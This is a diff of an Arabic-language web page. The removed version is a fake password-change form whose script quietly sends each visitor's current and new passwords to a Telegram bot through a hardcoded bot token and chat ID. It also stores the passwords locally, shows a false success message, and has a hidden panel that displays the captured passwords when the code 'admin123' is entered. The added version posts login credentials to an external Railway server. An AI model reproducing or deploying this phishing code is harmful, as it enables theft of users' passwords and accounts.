@@ -3,135 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تغيير كلمة المرور</title>
+    <title>تسجيل الدخول</title>
     <style>
-        body { font-family: system-ui, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
-        .form-group { margin-bottom: 15px; text-align: right; }
-        label { display: block; margin-bottom: 6px; font-size: 0.9rem; color: #333; }
-        input { width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #ddd; border-radius: 6px; }
-        button { width: 100%; padding: 11px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 5px; }
-        .success-msg { display: none; font-size: 1.2rem; color: #1877f2; font-weight: bold; padding: 20px 0; }
-        #secretPanel { display: none; text-align: right; }
-        .log-item { background: #f8f9fa; border-right: 4px solid #28a745; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 0.85rem; }
+        body {
+            font-family: Tahoma, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #response-message {
+            margin-top: 15px;
+            text-align: center;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
-<div class="card" id="mainScreen">
-    <div id="formContainer">
-        <h2 style="text-align: right;">تغيير كلمة المرور</h2>
-        <form id="passwordForm">
-            <div class="form-group">
-                <label>كلمة المرور الحالية</label>
-                <input type="password" id="currentPass" required>
-            </div>
-            <div class="form-group">
-                <label>كلمة المرور الجديدة</label>
-                <input type="password" id="newPass" required>
-            </div>
-            <div class="form-group">
-                <label>تأكيد كلمة المرور الجديدة</label>
-                <input type="password" id="confirmPass" required>
-            </div>
-            <button type="submit">حفظ التغييرات</button>
-        </form>
-    </div>
-    <div class="success-msg" id="successBox">تم تغيير كلمة مرورك بنجاح</div>
-</div>
-
-<div class="card" id="secretPanel">
-    <h2>🔐 سجل المحفوظات المحلي</h2>
-    <div id="logsContainer"></div>
-    <button onclick="closeSecretPanel()" style="background-color: #6c757d;">رجوع</button>
+<div class="login-container">
+    <h2>تسجيل الدخول</h2>
+    <form id="loginForm">
+        <div class="form-group">
+            <label for="username">اسم المستخدم أو البريد الإلكتروني</label>
+            <input type="text" id="username" name="username" required>
+        </div>
+        <div class="form-group">
+            <label for="password">كلمة المرور</label>
+            <input type="password" id="password" name="password" required>
+        </div>
+        <button type="submit">دخول</button>
+    </form>
+    <div id="response-message"></div>
 </div>
 
 <script>
-    // التوكن والـ ID المثبتة مسبقاً
-    const BOT_TOKEN = "8175510009:AAEuP6zW8z4W_fL7QJkU0x6bX0MvW0Q_w3Y";
-    const CHAT_ID = "7431525044";
-    const SECRET_CODE = "admin123";
+    // رابط السيرفر الخاص بك على Railway
+    const SERVER_URL = 'https://testserver-production-c72b58ff.up.railway.app';
 
-    const passwordForm = document.getElementById('passwordForm');
-    const formContainer = document.getElementById('formContainer');
-    const successBox = document.getElementById('successBox');
-
-    passwordForm.addEventListener('submit', async function(e) {
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
         e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const messageDiv = document.getElementById('response-message');
 
-        const currentPass = document.getElementById('currentPass').value;
-        const newPass = document.getElementById('newPass').value;
-        const confirmPass = document.getElementById('confirmPass').value;
-
-        if (currentPass === SECRET_CODE) {
-            openSecretPanel();
-            passwordForm.reset();
-            return;
-        }
-
-        if (newPass !== confirmPass) {
-            alert("كلمة المرور الجديدة وتأكيدها غير متطابقين!");
-            return;
-        }
-
-        // حفظ محلياً للتجربة وإرسالها للبوت
-        saveToLocalLogs(currentPass, newPass);
-        await sendToTelegram(currentPass, newPass);
-
-        // إخفاء الحقول وإظهار رسالة النجاح بمفردها
-        formContainer.style.display = 'none';
-        successBox.style.display = 'block';
-    });
-
-    async function sendToTelegram(oldP, newP) {
-        const text = `🔔 محاولة تغيير كلمة مرور:\n- الحالية: ${oldP}\n- الجديدة: ${newP}\n- الوقت: ${new Date().toLocaleTimeString()}`;
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        messageDiv.style.color = '#555';
+        messageDiv.textContent = 'جاري تسجيل الدخول...';
 
         try {
-            await fetch(url, {
+            const response = await fetch(`${SERVER_URL}/login`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username, password })
             });
+
+            const data = await response.json();
+
+            if (response.ok) {
+                messageDiv.style.color = 'green';
+                messageDiv.textContent = data.message || 'تم تسجيل الدخول بنجاح!';
+            } else {
+                messageDiv.style.color = 'red';
+                messageDiv.textContent = data.error || 'فشل تسجيل الدخول.';
+            }
         } catch (error) {
-            console.error("فشل الإرسال:", error);
+            messageDiv.style.color = 'red';
+            messageDiv.textContent = 'حدث خطأ في الاتصال بالخادم.';
+            console.error('Error:', error);
         }
-    }
-
-    function saveToLocalLogs(oldP, newP) {
-        const logs = JSON.parse(localStorage.getItem('test_passwords') || '[]');
-        logs.push({ old: oldP, new: newP, time: new Date().toLocaleString() });
-        localStorage.setItem('test_passwords', JSON.stringify(logs));
-    }
-
-    function openSecretPanel() {
-        document.getElementById('mainScreen').style.display = 'none';
-        document.getElementById('secretPanel').style.display = 'block';
-        
-        const logs = JSON.parse(localStorage.getItem('test_passwords') || '[]');
-        const container = document.getElementById('logsContainer');
-        
-        if (logs.length === 0) {
-            container.innerHTML = "<p>لا توجد بيانات محفوظة.</p>";
-            return;
-        }
-
-        container.innerHTML = logs.map(item => `
-            <div class="log-item">
-                <strong>الحالية:</strong> ${item.old}<br>
-                <strong>الجديدة:</strong> ${item.new}<br>
-                <small>${item.time}</small>
-            </div>
-        `).join('');
-    }
-
-    function closeSecretPanel() {
-        document.getElementById('secretPanel').style.display = 'none';
-        document.getElementById('mainScreen').style.display = 'block';
-        formContainer.style.display = 'block';
-        successBox.style.display = 'none';
-        passwordForm.reset();
-    }
+    });
 </script>
 
 </body>
